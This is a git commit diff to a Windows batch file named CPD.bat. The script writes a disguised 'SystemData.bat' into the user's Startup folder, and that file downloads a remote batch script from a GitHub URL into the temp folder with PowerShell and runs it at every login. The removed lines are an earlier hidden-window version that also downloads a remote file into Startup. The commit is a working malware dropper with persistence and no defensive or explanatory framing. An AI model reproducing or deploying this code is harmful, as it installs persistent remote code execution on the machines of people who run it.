d03eb4459d81c154e8ac7b7aa0602d46f87ccb64
lcmandrikion-hash <lcmandrikion@gmail.com>
2026-03-16 23:20:31 -0300

    Update CPD.bat

--- CPD.bat
+++ CPD.bat
@@ -1,17 +1,12 @@
 @echo off
 
+set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 
-:: Reexecuta o próprio script oculto
-if "%1" neq "hidden" (
-    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -ArgumentList hidden"
-    exit
-)
+echo @echo off > "%startup%\SystemData.bat"
+echo set "url=https://raw.githubusercontent.com/lcmandrikion-hash/LZX/main/LXZ4.bat" >> "%startup%\SystemData.bat"
+echo set "arquivo=%%TEMP%%\LZX.bat" >> "%startup%\SystemData.bat"
+echo powershell -command "Invoke-WebRequest -Uri '%%url%%' -OutFile '%%arquivo%%'" >> "%startup%\SystemData.bat"
+echo start "" "%%arquivo%%" >> "%startup%\SystemData.bat"
+echo exit >> "%startup%\SystemData.bat"
 
-:: URL do .exe
-set "URL=https://github.com/lcmandrikion-hash/LZX/raw/refs/heads/main/LXZ.bat"
-
-:: Caminho da pasta Startup
-set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\System.bat"
-
-:: Baixa o arquivo
-powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%STARTUP%'"
+exit
